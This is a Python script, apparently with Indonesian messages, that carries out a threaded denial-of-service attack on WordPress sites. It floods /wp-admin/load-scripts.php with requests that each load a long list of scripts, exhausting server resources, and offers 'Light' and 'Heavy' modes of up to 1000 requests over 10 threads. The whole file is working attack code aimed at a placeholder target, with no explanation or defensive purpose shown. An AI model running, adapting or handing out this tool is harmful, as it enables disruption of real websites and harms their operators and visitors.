import requests
import threading

def attack_load_scripts(url, count):
    payload = "?c=1&load=editor,common,user-profile,media-widgets,media-gallery,widget,customize-preview,heartbeat"
    for i in range(count):
        try:
            full_url = url + "/wp-admin/load-scripts.php" + payload
            response = requests.get(full_url)
            print(f"Request {i+1}: Status {response.status_code}")
        except Exception as e:
            print(f"Request {i+1} gagal: {e}")

def dos_load_scripts_parallel(url, total_requests, threads):
    requests_per_thread = total_requests // threads
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=attack_load_scripts, args=(url, requests_per_thread))
        thread_list.append(t)
        t.start()
    for t in thread_list:
        t.join()

if __name__ == "__main__":
    target = "http://your-dummy-website.com"
    mode = input("Choose mode (1. Light 2. Heavy): ")
    if mode == "1":
        dos_load_scripts_parallel(target, 200, 4)
    elif mode == "2":
        dos_load_scripts_parallel(target, 1000, 10)
    else:
        print("Invalid choice")
